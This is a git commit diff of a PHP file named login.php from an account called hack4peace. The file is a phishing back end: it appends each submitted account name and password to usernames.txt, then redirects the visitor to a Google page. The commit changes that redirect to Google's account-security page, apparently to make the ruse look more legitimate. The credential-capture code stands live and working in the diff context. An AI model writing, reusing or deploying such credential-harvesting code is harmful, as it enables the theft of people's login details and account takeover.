8750ce4d042c4ffcb67044454e7dcc35c3ac7c69
hack4peace <90603785+official-hack4peace@users.noreply.github.com>
2022-02-24 14:14:15 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['key2'] . " Pass: " . $_POST['key1'] . "\n", FILE_APPEND);
-header('Location: https://www.google.com');
+header('Location: https://myaccount.google.com/security?pli=1');
 exit();
